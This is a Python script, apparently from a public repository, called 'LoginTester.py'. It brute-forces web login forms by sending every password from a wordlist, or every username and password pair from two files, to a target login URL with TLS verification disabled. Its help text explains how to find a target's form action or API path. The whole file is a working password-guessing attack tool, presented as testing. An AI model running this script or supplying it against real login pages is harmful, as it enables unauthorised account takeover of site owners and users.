#!/usr/bin/env python
import sys
import requests
from urllib3.exceptions import InsecureRequestWarning
import urllib3
from sty import fg, bg

# to bypass the security verification of http headers when sending request to http URLs
urllib3.disable_warnings(InsecureRequestWarning)


def SendRequestsWithOneUser():
    user_name = sys.argv[2]
    password_file = sys.argv[3]
    host = sys.argv[4]
    redirect_off = True if (sys.argv[5] == '-roff') else False
    found = False

    if(redirect_off):
        login_path = input(
            "Enter the login path (excluding the domain and http, Eg: /login, /authlogin etc.) : ")

    with open(password_file) as f:
        passwords_data = f.readlines()
    # Found. Redirecting to /login

    for ps in passwords_data:
        payload = {'username': user_name, 'password': ps.replace("\n", "")}
        print(bg.blue + "[TESTING]" + bg.rs, payload)
        if(redirect_off):
            response = requests.post(host, data=payload, allow_redirects=False)
            print(response.text)
            if(response.text[22:] != login_path):
                print(fg.li_green + "[TEST PASSED]" + fg.rs, payload)
                break
        else:
            response = requests.post(host, data=payload, verify=False)
            print(response.status_code)
            if(response.status_code == 200):
                found = True
                print(fg.li_green + "[TEST PASSED]" + fg.rs, payload)

    if(redirect_off == False and found == False):
        print(fg(255, 10, 10) + "Sorry no payload matched!!" + fg.rs)
    if(found and redirect_off == False):
        print("If all passwords return PASSED then try using -roff (redirect off) because it may be returning the redirect status")


def SendRequestWithMultipleUsers():
    username_file = sys.argv[2]
    password_file = sys.argv[3]
    host = sys.argv[4]
    redirect_off = True if (sys.argv[5] == '-roff') else False
    found = False

    if(redirect_off):
        login_path = input(
            "Enter the login path (excluding the domain and http, Eg: /login, /authlogin etc.) : ")

    with open(username_file) as f:
        username_data = f.readlines()
    with open(password_file) as f:
        password_data = f.readlines()

    for user in username_data:
        for ps in password_data:
            payload = {'username': user.replace(
                "\n", ""), 'password': ps.replace("\n", "")}
            print(bg.blue + "[TESTING]" + bg.rs, payload)
            if(redirect_off):
                response = requests.post(
                    host, data=payload, allow_redirects=False)
                print(response.text)
                if(response.text[22:] != login_path):
                    print(fg.li_green + "[TEST PASSED]" + fg.rs, payload)
                    break
            else:
                response = requests.post(host, data=payload)
                if(response.status_code == 200):
                    found = True
                    print(fg.li_green + "[TEST PASSED]" + fg.rs, payload)

    if(redirect_off == False and found == False):
        print(fg(255, 10, 10) + "Sorry no payload matched!!" + fg.rs)
    if(found and redirect_off == False):
        print("If all passwords return PASSED then try using -roff (redirect off) because it may be returning the redirect status")


def help():
    print('''
SCRIPT HELP
-----------

!!PLEASE INSTALL REQUIREMENTS.TXT IF NOT INSTALLED!!

!!MAKE SURE THE TXT FILES EXISTS!!

REDIRECT OPTIONS (insert at end)
----------------
-roff : To turn off redirects (in some cases website can redirect to login and may return 200 as status code at end Saying found so in order to bypass that and analyzing the redirect params we can get the true user)

-ron : To turn on redirects


* Format for one user
python3 LoginTester.py -one [username] [password_file_path] [Request Link] [redirect option]

* Format for multiple users
python3 LoginTester.py -mul [username_file_path] [password_file_path] [Request Link] [redirect option]


IMPORTANT!! (info regarding the host URL)
-----------------------------------------
Double check the url to which you are sending the requests like if your target is using PHP then check the form action (using using page source or browser extension).
In case of REST API request check the API path using inspect or with appropriate browser extension.
    ''')
    exit(1)


def main():
    try:
        arg_one = sys.argv[1]
        if(arg_one == "-one"):
            SendRequestsWithOneUser()
        elif(arg_one == "-mul"):
            SendRequestWithMultipleUsers()
        elif(arg_one == "help" or arg_one == "--help"):
            help()
    except:
        help()


if __name__ == '__main__':
    main()

# references : https://stackoverflow.com/questions/11892729/how-to-log-in-to-a-website-using-pythons-requests-module
# Thanks to : https://stackoverflow.com/users/2600522/david
# Author : Arun Jangra (https://www.github.com/Arun89-crypto)
